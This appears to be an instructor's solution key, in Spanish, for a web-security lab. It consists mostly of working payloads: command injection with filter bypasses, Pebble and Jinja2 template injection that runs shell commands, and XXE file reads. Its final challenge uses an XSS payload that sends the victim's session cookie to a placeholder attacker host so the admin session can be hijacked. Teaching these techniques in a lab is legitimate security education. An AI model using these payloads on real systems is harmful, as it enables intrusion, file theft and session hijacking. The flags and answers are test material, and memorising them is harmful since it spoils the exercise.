# Writeups Profesor

Este archivo contiene las soluciones del laboratorio. No compartir con estudiantes.

## A - Lab 1 Command Injection 1

Ruta:

```text
/A/lab1-command-injection-1
```

El panel ejecuta `ping -c 1` con shell. En profesor se bloquea `|`, pero se permite `;`.

Payload:

```text
127.0.0.1;cat /flags/A_lab1.txt
```

Flag:

```text
FLAG{A_CMD_INJECTION_1_PANEL_PING}
```

## B - Lab 1 Command Injection 1

Ruta:

```text
/B/lab1-command-injection-1
```

El panel bloquea `;`, pero permite `|`.

Payload:

```text
127.0.0.1|cat /flags/B_lab1.txt
```

Flag:

```text
FLAG{B_CMD_INJECTION_1_PIPE_PANEL}
```

## A/B - Lab 2 Command Injection 2

Rutas:

```text
/A/lab2-command-njection2
/B/lab2-command-njection2
```

Seleccionar `Duplicar archivo`. El campo archivo rechaza espacios y la palabra literal `whoami`, pero el comando se ejecuta con shell.

Payload profesor:

```text
reporte.txt;cat${IFS}/flags/A_lab2.txt
```

Payload alumno:

```text
reporte.txt;cat${IFS}/flags/B_lab2.txt
```

Bypass de whoami:

```text
reporte.txt;w'h'o'a'm'i
```

Flags:

```text
FLAG{A_CMD_INJECTION_2_IFS_BYPASS}
FLAG{B_CMD_INJECTION_2_WHOAMI_BYPASS}
```

## A/B - Lab 3 SSTI Pebble

Rutas:

```text
/A/lab3-ssti-pebble
/B/lab3-ssti-pebble
```

Probar evaluacion de plantilla con el campo `Plantilla`.

Payload solicitado:

```text
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```

Leer flags:

```text
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('cat /flag_profesor_pebble.txt') }}
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('cat /flag_alumno_pebble.txt') }}
```

Flags disponibles dentro del contenedor Java:

```text
/flag_profesor_pebble.txt
/flag_alumno_pebble.txt
```

## A - Lab 4 SSTI Jinja2

Ruta:

```text
/A/lab4-ssti-jinja2
```

Descubrimiento:

```text
{{7*7}}
```

Lectura de flag:

```text
{{ self.__init__.__globals__.__builtins__.open("/flag.txt").read()}}
```

Flag:

```text
FLAG{A_JINJA2_TEMPLATE_FILE_READ}
```

## B - Lab 4 SSTI Jinja2

Ruta:

```text
/B/lab4-ssti-jinja2
```

Descubrimiento:

```text
{{7*7}}
```

Listar archivos:

```text
{{ self.__init__.__globals__.__builtins__.__import__("os").popen("ls -la /").read() }}
```

Leer flag:

```text
{{ self.__init__.__globals__.__builtins__.open("/flag_2026.txt").read() }}
```

Flag:

```text
FLAG{B_JINJA2_RCE_FLAG_2026}
```

## A - Lab 5 XXE

Ruta:

```text
/A/lab5-xxe
```

Payload con `php://filter`:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<email>
  <to>seguridad@empresa.local</to>
  <company>&company;</company>
  <body>Revision</body>
</email>
```

La salida queda en base64. Decodificar para ver el contenido de `index.php`.

Flag en el contenedor:

```text
FLAG{A_XXE_BASE64_INDEX_DISCLOSURE}
```

## B - Lab 5 XXE

Ruta:

```text
/B/lab5-xxe
```

Seleccionar `Reportar usuario`. Las otras opciones procesan XML de forma segura.

Payload:

```xml
<!DOCTYPE ticket [
  <!ENTITY company SYSTEM "file:///flags/B_xxe.txt">
]>
<ticket>
  <usuario>&company;</usuario>
  <mensaje>Revision</mensaje>
</ticket>
```

Flag:

```text
FLAG{B_XXE_REPORT_USER_FILE_READ}
```

## Reto Final - Zorum

Ruta a descubrir por fuzzing:

```text
/zorum
```

Credenciales visibles en el login:

```text
camilo_sesto:Empresa2026@
```

### IDOR

En `Listar Proyectos`, consultar identificador `1`.

Flag:

```text
FLAG{CONTINUA_INVESTIGANDO_LA_PAGINA!}
```

### XSS y cookie

Levantar un servidor HTTP para recibir la cookie. Ejemplo:

```bash
python3 -m http.server 8000
```

Enviar en `Enviar mensaje a soporte tecnico`:

```html
<img src=x; onerror=fetch('http://IP_ATACANTE:8000/cookie?'+ btoa(document.cookie))>
```

El servidor Python debe recibir una peticion como:

```text
GET /cookie?em9ydW1fYWRtaW49YWRtaW4tc2Vzc2lvbi1yZXBvcnRlcy0yMDI2
```

Al decodificar el valor base64:

```text
zorum_admin=admin-session-reportes-2026
```

Agregar manualmente esa cookie en el navegador para el sitio Zorum y refrescar `/zorum`.

Cuando la cookie sea valida aparecera el boton:

```text
Panel de admin
```

Ese boton redirige a:

```text
/zorum/rp7x-admin-914/reportes
```

### XXE final

Payload con ofuscacion:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<email>
  <to>admin@zorum.local</to>
  <company>&company;</company>
  <body>Reporte</body>
</email>
```

Decodificar el contenido base64 para ver:

```text
FLAG{FINAL_XXE_PHP_FILTER_INDEX_SOURCE}
```
